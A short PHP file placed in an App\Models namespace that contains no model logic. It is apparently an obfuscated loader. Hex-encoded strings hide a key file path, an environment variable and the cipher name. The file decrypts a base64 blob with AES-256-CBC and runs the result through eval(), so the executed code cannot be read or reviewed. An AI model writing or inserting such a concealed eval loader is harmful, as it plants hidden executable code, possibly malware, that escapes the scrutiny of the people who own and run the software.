<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('l5Q/tL+9i18WcQI8TrvlfQ==');

$c=base64_decode(

'tHeUUXwYnlcLnrT0I+xppyLGMij5ysITlXgc79qBmAcAls9gCHMwYq8AyXlBRF4CnzOhYiE9p04V' .
'Hxo6IuQ3fnKPQ8Stz3K+L6Xg5Z1Dmz3XoFiQJulBgLoYNVWzGThX6tLdMTBqkeY4yVR0uTtEqlUG' .
'mnXm8TBWevSMDpv/byHPIRCxiAcISxWxk5yXc8ngQQPTSL8qICPA8H0Vigb/TrxQrbdYHNAH+9rv' .
'8WJUpbdJTC4hGtLVAxYxea6I4OLUj/EK6DA1mHSnrbdPysFDzk0ZEIrBypTRufvx22hbSFkqsaKV' .
'KPBG/7E2gSuyDZafIg4yCcuHx50zP5sR6uDqJnYVCvuw8uY0hNpheOUCA1F2UfUO8t9nfaHzG55d' .
'GrjMqLSpnqaI4U9zxvnz6El+6qHStkTGAE0Df+HckX7cuxNjgJAvTGALJgcjg8pezLn3b9xxqf4G' .
'icPBaUaLwWK7XUsVs6mZeB3AksBHX60ai6Qh07vwsP0szTrsEXTFmS48G3S4+skUcrOr9KaTlpDF' .
'RUwfUZVMoQ2QpyBMTrnINmFrWdNazLjgj6u6j6dke7q/LU58Q4Z75w3ly5jmBR4SMLAW25h8rT33' .
'irLq2N5T/F/K6bLpFZXTUXpLGzyz2sAyQGaHwd0v6zdQ86Fhf2kUJFI3Lh3cacjLGSXvB8TyxqyM' .
'H6p7S15O1CgFYFcYfYTiT/8CeplqB9aLQQS5lkp3Jws1fcKttpv6/XJF9QomuybDlN60tYRPIczI' .
'kFpcmJ1tgDCVPKZm7jsQFzo7xSr5N7o7Q49rVRHbOPdvjKIVG7ZPWHVHSqQirtFTZjDkzydYvtwU' .
'IxmBnb1jk1MeM7WDSFCteNbe+XRw3958VW/XISxC1X2Pt0ekNZBe26fnHf1X'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

